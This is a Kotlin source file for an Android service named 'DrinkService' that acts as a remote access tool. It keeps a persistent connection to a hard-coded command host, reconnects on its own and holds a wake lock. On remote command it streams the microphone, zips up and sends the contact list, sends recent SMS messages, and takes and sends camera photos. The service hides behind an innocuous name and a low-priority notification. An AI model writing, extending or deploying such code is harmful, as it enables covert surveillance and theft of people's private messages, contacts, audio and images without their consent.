package com.drink

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class DrinkService : Service() {

    companion object {
        const val ACTION_STATUS = "com.drink.STATUS"
        const val EXTRA_CONNECTED = "connected"
        private const val HOST = "192.168.1.149"
        private const val PORT = 33110
        private const val CHANNEL_ID = "drink_channel"
        private const val NOTIF_ID = 1
        private const val SAMPLE_RATE = 16000
        private const val RECONNECT_DELAY = 15000L
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var socketManager: SocketManager? = null
    private var micJob: Job? = null
    private var reconnectJob: Job? = null
    private var running = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "drink:lock").apply {
            runCatching { acquire() }
        }
        applyForegroundMode(0)

        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                triggerReconnect()
            }
            override fun onLost(network: Network) {
                runCatching { socketManager?.close() }
            }
        }
        networkCallback = callback
        runCatching { cm.registerDefaultNetworkCallback(callback) }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            scope.launch { connectionLoop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        micJob?.cancel()
        reconnectJob?.cancel()
        socketManager?.close()
        runCatching {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            networkCallback?.let { cm.unregisterNetworkCallback(it) }
        }
        scope.cancel()
        runCatching { wakeLock?.release() }
        super.onDestroy()
    }

    private fun triggerReconnect() {
        reconnectJob?.cancel()
    }

    private fun applyForegroundMode(extraType: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (extraType != 0) {
                type = type or extraType
            }
            runCatching {
                startForeground(NOTIF_ID, buildNotification(), type)
            }
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }
    }

    private suspend fun connectionLoop() {
        while (running) {
            try {
                val sm = SocketManager(HOST, PORT)
                socketManager = sm
                broadcastStatus(true)
                commandLoop(sm)
            } catch (e: Exception) {
                broadcastStatus(false)
            } finally {
                socketManager?.close()
                socketManager = null
                micJob?.cancel()
                micJob = null
                broadcastStatus(false)
            }
            if (running) {
                try {
                    coroutineScope {
                        reconnectJob = launch { delay(RECONNECT_DELAY) }
                        reconnectJob?.join()
                    }
                } catch (e: CancellationException) {
                }
            }
        }
    }

    private suspend fun commandLoop(sm: SocketManager) {
        while (running && sm.isConnected()) {
            val frame = sm.readFrame()
            when (frame.optString("cmd")) {
                "use_mic" -> handleMic(sm)
                "get_contacts" -> handleContacts(sm)
                "get_sms" -> handleSms(sm, frame)
                "list_cams" -> handleListCams(sm)
                "use_cam" -> handleUseCam(sm, frame)
                "disconnect" -> {
                    micJob?.cancel()
                    sm.close()
                    return
                }
            }
        }
    }

    private fun handleMic(sm: SocketManager) {
        micJob?.cancel()
        micJob = scope.launch {
            if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                val errorHeader = JSONObject().apply {
                    put("type", "error")
                    put("message", "Record audio permission not granted")
                }
                sm.sendFrame(errorHeader)
                return@launch
            }
            applyForegroundMode(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
            val bufferSize = AudioRecord.getMinBufferSize(
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT
            )
            val recorder = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                bufferSize
            )
            try {
                recorder.startRecording()
                val buffer = ByteArray(bufferSize)
                while (isActive && sm.isConnected()) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val chunk = buffer.copyOf(read)
                        val header = JSONObject().apply {
                            put("type", "mic_chunk")
                            put("size", chunk.size)
                        }
                        sm.sendFrame(header, chunk)
                    }
                }
            } catch (e: Exception) {
                val errorHeader = JSONObject().apply {
                    put("type", "error")
                    put("message", e.message ?: "Mic stream failed")
                }
                sm.sendFrame(errorHeader)
            } finally {
                runCatching {
                    recorder.stop()
                    recorder.release()
                }
                applyForegroundMode(0)
            }
        }
    }

    private suspend fun handleContacts(sm: SocketManager) = withContext(Dispatchers.IO) {
        try {
            val contacts = readContacts()
            val zipBytes = buildContactsZip(contacts)
            val header = JSONObject().apply {
                put("type", "contacts")
                put("size", zipBytes.size)
            }
            sm.sendFrame(header, zipBytes)
        } catch (e: Exception) {
            val errorHeader = JSONObject().apply {
                put("type", "error")
                put("message", e.message ?: "Failed to get contacts")
            }
            sm.sendFrame(errorHeader)
        }
    }

    private fun readContacts(): List<Map<String, String>> {
        val result = mutableListOf<Map<String, String>>()
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return result
        }
        try {
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                ),
                null, null, null
            ) ?: return result
            cursor.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) ?: "" else ""
                    val phone = if (phoneIdx != -1) it.getString(phoneIdx) ?: "" else ""
                    result.add(mapOf(
                        "name" to name,
                        "phone" to phone,
                    ))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    private fun buildContactsZip(contacts: List<Map<String, String>>): ByteArray {
        val baos = ByteArrayOutputStream()
        ZipOutputStream(baos).use { zip ->
            zip.putNextEntry(ZipEntry("contacts.json"))
            val arr = JSONArray()
            contacts.forEach { c ->
                val obj = JSONObject()
                obj.put("name", c["name"] ?: "")
                obj.put("phone", c["phone"] ?: "")
                arr.put(obj)
            }
            zip.write(arr.toString().toByteArray(Charsets.UTF_8))
            zip.closeEntry()
        }
        return baos.toByteArray()
    }

    private suspend fun handleSms(sm: SocketManager, frame: JSONObject) = withContext(Dispatchers.IO) {
        try {
            val hours = frame.optInt("hours", 24)
            val messages = readSms(hours)
            val response = JSONObject().apply {
                put("type", "sms")
                put("hours", hours)
                put("data", messages)
            }
            sm.sendFrame(response)
        } catch (e: Exception) {
            val errorHeader = JSONObject().apply {
                put("type", "error")
                put("message", e.message ?: "Failed to read SMS")
            }
            sm.sendFrame(errorHeader)
        }
    }

    private fun readSms(hours: Int): JSONArray {
        val result = JSONArray()
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return result
        }
        try {
            val since = System.currentTimeMillis() - hours.toLong() * 60 * 60 * 1000L
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                ),
                "${Telephony.Sms.DATE} > ?",
                arrayOf(since.toString()),
                "${Telephony.Sms.DATE} DESC"
            ) ?: return result
            cursor.use {
                val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)
                while (it.moveToNext()) {
                    result.put(JSONObject().apply {
                        put("address", if (addrIdx != -1) it.getString(addrIdx) ?: "" else "")
                        put("body", if (bodyIdx != -1) it.getString(bodyIdx) ?: "" else "")
                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
                        put("type", if (typeIdx != -1) it.getInt(typeIdx) else 0)
                    })
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    private fun handleListCams(sm: SocketManager) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraIds = cameraManager.cameraIdList
            val arr = JSONArray()
            for (id in cameraIds) {
                arr.put(id)
            }
            val response = JSONObject().apply {
                put("type", "cams")
                put("data", arr)
            }
            sm.sendFrame(response)
        } catch (e: Exception) {
            val errorHeader = JSONObject().apply {
                put("type", "error")
                put("message", e.message ?: "Failed to list cameras")
            }
            sm.sendFrame(errorHeader)
        }
    }

    private fun handleUseCam(sm: SocketManager, frame: JSONObject) {
        val camId = frame.optString("cam_id", "0")
        scope.launch(Dispatchers.IO) {
            captureCamera(sm, camId)
        }
    }

    private fun captureCamera(sm: SocketManager, camId: String) {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                val err = JSONObject().apply {
                    put("type", "error")
                    put("message", "Camera permission not granted")
                }
                sm.sendFrame(err)
                return
            }
            applyForegroundMode(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)

            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val characteristics = cameraManager.getCameraCharacteristics(camId)
            val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
            val targetSize = jpegSizes?.filter { it.width in 640..1920 }?.maxByOrNull { it.width } ?: jpegSizes?.firstOrNull()
            val width = targetSize?.width ?: 1280
            val height = targetSize?.height ?: 720

            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 3)
            val thread = HandlerThread("CameraCaptureThread").apply { start() }
            val handler = Handler(thread.looper)

            var cameraDevice: CameraDevice? = null
            var session: CameraCaptureSession? = null
            var framesReceived = 0
            var captured = false

            val cleanup = {
                runCatching { session?.stopRepeating() }
                runCatching { session?.close() }
                runCatching { cameraDevice?.close() }
                runCatching { imageReader.close() }
                runCatching { thread.quitSafely() }
                applyForegroundMode(0)
            }

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                framesReceived++
                if (framesReceived < 8 && !captured) {
                    image.close()
                    return@setOnImageAvailableListener
                }
                if (!captured) {
                    captured = true
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        val header = JSONObject().apply {
                            put("type", "camera_capture")
                            put("cam_id", camId)
                            put("size", bytes.size)
                        }
                        sm.sendFrame(header, bytes)
                    } catch (e: Exception) {
                        val err = JSONObject().apply {
                            put("type", "error")
                            put("message", e.message ?: "Failed to process photo")
                        }
                        sm.sendFrame(err)
                    } finally {
                        image.close()
                        cleanup()
                    }
                } else {
                    image.close()
                }
            }, handler)

            cameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = imageReader.surface
                        val targets = listOf(surface)
                        camera.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(captureSession: CameraCaptureSession) {
                                session = captureSession
                                try {
                                    val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                        set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                                    }
                                    captureSession.setRepeatingRequest(requestBuilder.build(), null, handler)
                                    handler.postDelayed({
                                        if (!captured) {
                                            framesReceived = 8
                                        }
                                    }, 1200)
                                } catch (e: Exception) {
                                    cleanup()
                                    val err = JSONObject().apply {
                                        put("type", "error")
                                        put("message", e.message ?: "Failed capture")
                                    }
                                    sm.sendFrame(err)
                                }
                            }

                            override fun onConfigureFailed(captureSession: CameraCaptureSession) {
                                cleanup()
                                val err = JSONObject().apply {
                                    put("type", "error")
                                    put("message", "Camera session config failed")
                                }
                                sm.sendFrame(err)
                            }
                        }, handler)
                    } catch (e: Exception) {
                        cleanup()
                        val err = JSONObject().apply {
                            put("type", "error")
                            put("message", e.message ?: "Failed to create session")
                        }
                        sm.sendFrame(err)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    cleanup()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    cleanup()
                    val err = JSONObject().apply {
                        put("type", "error")
                        put("message", "Camera error $error")
                    }
                    sm.sendFrame(err)
                }
            }, handler)
        } catch (e: Exception) {
            val err = JSONObject().apply {
                put("type", "error")
                put("message", e.message ?: "Failed to open camera")
            }
            sm.sendFrame(err)
        }
    }

    private fun broadcastStatus(connected: Boolean) {
        val intent = Intent(ACTION_STATUS).apply {
            putExtra(EXTRA_CONNECTED, connected)
        }
        sendBroadcast(intent)
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Drink Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("drink")
        .setContentText("drink is running")
        .setSmallIcon(android.R.drawable.ic_dialog_info)
        .build()
}
